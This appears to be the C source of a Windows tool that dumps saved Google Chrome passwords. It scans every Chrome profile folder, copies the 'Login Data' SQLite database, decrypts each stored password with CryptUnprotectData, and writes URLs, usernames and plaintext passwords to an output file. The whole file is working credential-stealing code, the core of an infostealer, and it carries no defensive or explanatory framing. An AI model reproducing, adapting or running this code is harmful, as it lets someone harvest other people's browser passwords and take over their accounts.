#include "DumpChrome.h"

#define DB_TEMP ".\\db_temp"

char TableName[50];
char ColumnName[50];
FILE *output = NULL;

int PasswordsCallback(void *passed_db, int argc, char **argv, char **col_name)
{
	DATA_BLOB encrypted_password;
	DATA_BLOB decrypted_password;
	sqlite3_blob *blob = NULL;
	sqlite3 *db = (sqlite3*)passed_db;
	int blob_size;
	BYTE *blob_data = NULL;
	unsigned char *password_array = NULL;
	int er;

	INT64 row_id = atoll(argv[0]);

	if (sqlite3_blob_open(db, "main", TableName, ColumnName, row_id, 0, &blob) == SQLITE_OK)
	{
		blob_size = sqlite3_blob_bytes(blob);
		if (blob_size)
		{
			blob_data = (BYTE *)malloc(blob_size);
			if (blob_data)
			{
				if (sqlite3_blob_read(blob, blob_data, blob_size, 0) == SQLITE_OK)
				{
					encrypted_password.pbData = blob_data;
					encrypted_password.cbData = blob_size;

					if (CryptUnprotectData(&encrypted_password, NULL, NULL, NULL, NULL, 0, &decrypted_password))
					{
						password_array = (unsigned char *)malloc(decrypted_password.cbData + 1);
						if (password_array)
						{
							memset(password_array, 0, decrypted_password.cbData + 1);
							memcpy(password_array, decrypted_password.pbData, decrypted_password.cbData);

							fprintf(output, " [%s][Passwords]\n URL: %s\n USERNAME: %s\n PASSWORD: %s\n\n", "GoogleChrome", argv[1], argv[2], password_array);

							free(password_array);
						}
						else
							printf("malloc(): Failed to allocate memory for password array\n");

						LocalFree(decrypted_password.pbData);
					}
					else
						printf("CryptUnprotectData(): Failed to decrypt blob, er %x\n", GetLastError());
				}
				else
					printf("sqlite3_blob_read(): %s\n", sqlite3_errmsg(db));

				free(blob_data);
			}
			else
				printf("malloc(): Failed to allocate memory for blob_data\n");
		}

		sqlite3_blob_close(blob);
	}
	else
		printf("sqlite3_blob_open(): %s\n", sqlite3_errmsg(db));

	return 0;
}

void PasswordsSetup(char *NewFile, char *rowid, char *url, char *username, char *encryptedRow, char *table)
{
	sqlite3* ChromeDatabase = NULL;
	char *QueryData = NULL;

	strcpy(TableName, table);
	strcpy(ColumnName, encryptedRow);

	QueryData = (char*)calloc(MAX_PATH, 1);
	if (QueryData)
	{
		sprintf(QueryData, "SELECT %s,%s,%s,%s FROM %s", rowid, url, username, encryptedRow, table);
		if (sqlite3_open_v2(NewFile, &ChromeDatabase, SQLITE_OPEN_READWRITE, NULL) == SQLITE_OK)
		{
			if (ChromeDatabase)
			{
				if (sqlite3_exec(ChromeDatabase, QueryData, PasswordsCallback, ChromeDatabase, NULL) == SQLITE_OK)
				{
					//do nothing
				}
				else
					printf("sqlite3_exec(): %s\n", sqlite3_errmsg(ChromeDatabase));

				sqlite3_close_v2(ChromeDatabase);
			}
			else
				printf("sqlite3 database null");
		}
		else
			printf("Failed to open database: %s\n", sqlite3_errmsg(ChromeDatabase));

		free(QueryData);
	}
	else
		printf("calloc\n");
}

void DumpPassword(char *PathFind, FILE *output)
{
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAA FindFileData;

	//Find file Login Data Chrome
	char PasswordPath[MAX_PATH];
	strcpy(PasswordPath, PathFind);
	strcat(PasswordPath, "\\Login Data");
	hFind = FindFirstFileA(PasswordPath, (LPWIN32_FIND_DATAA)&FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		if (CopyFileA(PasswordPath, DB_TEMP, FALSE))
		{
			fprintf(output, "\n========================================PASSWORDS========================================\n\n");
			PasswordsSetup(DB_TEMP, "rowid", "origin_url", "username_value", "password_value", "logins");

			DeleteFileA(DB_TEMP);
		}
	}
}

void DumpChrome()
{
	output = fopen("[output]", "w+");
	if (output)
	{
		char AppDataPath[MAX_PATH];
		SHGetSpecialFolderPathA(NULL, AppDataPath, CSIDL_LOCAL_APPDATA, TRUE);

		char ProfilePath[MAX_PATH];
		strcpy(ProfilePath, AppDataPath);
		strcat(ProfilePath, "\\Google\\Chrome\\User Data");

		HANDLE hList = INVALID_HANDLE_VALUE;
		WIN32_FIND_DATAA ListFileData;

		char PathList[MAX_PATH];
		char PathFind[MAX_PATH];

		strcpy(PathList, ProfilePath);
		strcat(PathList, "\\*");

		//list all file and call FindLoginDataFileAndGetInfor
		hList = FindFirstFileA(PathList, (LPWIN32_FIND_DATAA)&ListFileData);
		if (hList != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (ListFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (ListFileData.cFileName[0] != 0x2e)
					{
						
						strcpy(PathFind, ProfilePath);
						strcat(PathFind, "\\");
						strcat(PathFind, ListFileData.cFileName);

						DumpPassword(PathFind, output);

						
					}
				}
			} while (FindNextFileA(hList, (LPWIN32_FIND_DATAA)&ListFileData));

			FindClose(hList);
		}

		fclose(output);
	}
}